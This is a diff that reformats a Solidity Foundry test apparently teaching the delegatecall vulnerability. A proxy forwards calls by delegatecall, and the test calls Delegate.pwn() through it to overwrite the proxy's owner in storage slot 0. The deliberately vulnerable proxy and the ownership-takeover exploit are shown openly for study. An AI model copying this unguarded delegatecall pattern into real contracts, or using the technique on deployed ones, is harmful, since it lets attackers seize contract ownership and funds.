@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.15;
+pragma solidity ^0.8.18;
 
 import "forge-std/Test.sol";
 
@@ -8,18 +8,17 @@ import "forge-std/Test.sol";
 // Can you manipulate Proxy Contract's owner ?
 
 contract Proxy {
+    address public owner = address(0xdeadbeef); // slot0
+    Delegate delegate;
 
-  address public owner = address(0xdeadbeef); // slot0
-  Delegate delegate;
+    constructor(address _delegateAddress) public {
+        delegate = Delegate(_delegateAddress);
+    }
 
-  constructor(address _delegateAddress) public {
-    delegate = Delegate(_delegateAddress);
-  }
-
-  fallback() external {
-    (bool suc,) = address(delegate).delegatecall(msg.data);  // vulnerable
-    require(suc, "Delegatecall failed");
-  }
+    fallback() external {
+        (bool suc, ) = address(delegate).delegatecall(msg.data); // vulnerable
+        require(suc, "Delegatecall failed");
+    }
 }
 
 contract ContractTest is Test {
@@ -32,29 +31,29 @@ contract ContractTest is Test {
     }
 
     function testDelegatecall() public {
-        DelegateContract = new Delegate();              // logic contract
-        proxy = new Proxy(address(DelegateContract));   // proxy contract
-        
+        DelegateContract = new Delegate(); // logic contract
+        proxy = new Proxy(address(DelegateContract)); // proxy contract
+
         console.log("Alice address", alice);
         console.log("DelegationContract owner", proxy.owner());
-        
+
         // Delegatecall allows a smart contract to dynamically load code from a different address at runtime.
         console.log("Change DelegationContract owner to Alice...");
-        vm.prank(alice);   
+        vm.prank(alice);
         address(proxy).call(abi.encodeWithSignature("pwn()")); // exploit here
         // Proxy.fallback() will delegatecall Delegate.pwn()
 
         console.log("DelegationContract owner", proxy.owner());
-        console.log("Exploit completed, proxy contract storage has been manipulated");
+        console.log(
+            "Exploit completed, proxy contract storage has been manipulated"
+        );
     }
 }
 
 contract Delegate {
-  address public owner; // slot0
+    address public owner; // slot0
 
-  function pwn() public {
-    owner = msg.sender;
-  }
+    function pwn() public {
+        owner = msg.sender;
+    }
 }
-
-
